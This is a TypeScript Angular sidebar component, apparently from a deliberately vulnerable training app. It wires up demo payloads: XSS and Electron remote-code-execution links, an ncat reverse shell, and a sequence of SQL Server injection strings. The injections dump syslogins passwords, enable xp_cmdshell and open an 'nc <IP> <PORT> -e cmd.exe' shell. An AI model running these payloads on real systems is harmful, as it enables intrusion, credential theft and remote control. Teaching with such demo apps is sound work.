import { ChangeDetectionStrategy, Component } from '@angular/core';
import { AppRoutes, MarkdownQueryParams, SqliRoutes, XssRoutes } from 'app/shared/models/app-routes.model';
import { User } from 'app/shared/models/user.model';
import { ElectronService } from 'app/shared/services/electron.service';

@Component({
    selector: 'vulnerable-app-sidebar',
    templateUrl: './app-sidebar.component.html',
    styleUrls: ['./app-sidebar.component.scss'],
    changeDetection: ChangeDetectionStrategy.OnPush
})
export class AppSidebarComponent {
    /**
     * breadcrumbs routes
     */
    ROUTE_BREADCRUMBS: string = `${AppRoutes.XSS}/${XssRoutes.BREADCRUMBS}`;
    ROUTE_BREADCRUMBS_XSS: string = `${AppRoutes.XSS}/${XssRoutes.BREADCRUMBS}/<a href='javascript:alert("Uh oh... 😢")'>Breadcrumbs 2`;

    /**
     * electron routes
     */
    ROUTE_BREADCRUMBS_RCE_ELECTRON_DIR: string = `${AppRoutes.XSS}/${
        XssRoutes.ELECTRON
    }/<a href='javascript:require(%22child_process%22).exec(%22dir%22, function (e,r) { alert(r)})'>Electron RCE - dir`;
    ROUTE_BREADCRUMBS_RCE_ELECTRON_SHELL: string = `${AppRoutes.XSS}/${
        XssRoutes.ELECTRON
    }/<a href='javascript:require("child_process").exec("ncat 127.0.0.1 11235 -e cmd.exe", function (e,r) { alert(r)})'>Electron Shell - shell`;

    /**
     * markdown routes
     */
    ROUTE_MARKDOWN: string = `${AppRoutes.XSS}/${XssRoutes.MARKDOWN}`;

    /**
     * markdown query params
     */
    PARAM_MARKDOWN_CLEAN: any = { demo: MarkdownQueryParams.CLEAN };
    PARAM_MARKDOWN_NOT_WEAPONISED: any = { demo: MarkdownQueryParams.NOT_WEAPONISED };
    PARAM_MARKDOWN_WEAPONISED: any = { demo: MarkdownQueryParams.WEAPONISED };
    /**
     * form routes
     */
    ROUTE_FORMS: string = `${AppRoutes.XSS}/${XssRoutes.FORMS}`;

    /**
     * sqli routes
     */
    ROUTE_SQLI_EASY: string = `${AppRoutes.SQLI}/${SqliRoutes.EASY}`;

    /**
     * sqli query params
     */
    PARAM_SQLI_USER_101: User = { firstName: `' OR 1=1 --` };
    PARAM_SQLI_USER_VERSION: User = { firstName: `' UNION SELECT @@VERSION,2,3,4,5,6 --` };
    PARAM_SQLI_USER_ACCOUNTS: User = { firstName: `' UNION SELECT name,2,password,HOST_NAME(),5,DB_NAME() FROM master..syslogins --` };
    PARAM_SQLI_USER_SHELL_SHOW_ADVANCED: User = { firstName: `'; EXEC sp_configure \'show advanced options\', 1;--` };
    PARAM_SQLI_USER_SHELL_RECONFIGURE: User = { firstName: `'; RECONFIGURE;--` };
    PARAM_SQLI_USER_XP_CMDSHELL: User = { firstName: `'; EXEC sp_configure \'xp_cmdshell\', 1;--` };
    PARAM_SQLI_USER_XP_CMDSHELL_WHOAMI: User = { firstName: `'; EXEC xp_cmdshell \'whoami\';--` };
    PARAM_SQLI_USER_XP_CMDSHELL_IPCONFIG: User = { firstName: `'; EXEC xp_cmdshell \'ipconfig\';--` };
    PARAM_SQLI_USER_XP_CMDSHELL_SET: User = { firstName: `'; EXEC xp_cmdshell \'set\';--` };
    PARAM_SQLI_USER_XP_CMDSHELL_SHELL: User = { firstName: `'; EXEC xp_cmdshell \'nc <IP> <PORT> -e cmd.exe\';--` };

    constructor(public electronService: ElectronService) {}
}
